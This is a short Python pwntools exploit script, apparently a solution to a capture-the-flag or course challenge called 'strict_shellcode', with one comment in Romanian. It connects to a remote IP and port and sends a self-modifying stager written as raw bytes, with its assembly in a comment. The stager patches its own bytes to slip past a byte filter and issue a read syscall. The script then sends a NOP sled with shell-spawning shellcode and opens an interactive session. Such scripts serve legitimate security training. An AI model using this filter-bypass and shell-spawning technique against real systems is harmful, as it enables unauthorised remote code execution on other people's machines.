from pwn import *

context.terminal = ['tmux', 'split', '-h']
#p = process('./strict_shellcode')

# Nu merge serverul ???
p = remote('141.85.224.106', 31341 )
#gdb.attach(p)

"""
nop
mov rax, rdx
sub rax, 0x46
mov rsi, rax
add al, 0x23
mov rbx, [rax]
xor bx, 0x0303
mov [rax], rbx

xor rdi, rdi
xor rdx, rdx
mov dl, 0xff
xor rax, rax
syscall
"""

stager="\x90\x48\x89\xD0\x48\x83\xE8\x46\x48\x89\xC6\x04\x23\x48\x8B\x18\x66\x81\xF3\x03\x03\x48\x89\x18\x48\x31\xFF\x48\x31\xD2\xB2\xFF\x48\x31\xC0\x0c\x06"
stager+=(70-len(stager))*"\x90"
p.sendline(stager)

context.arch = "amd64"
shellcode = "\x90" * 80
shellcode += asm(shellcraft.sh())
p.sendline(shellcode)

p.interactive()
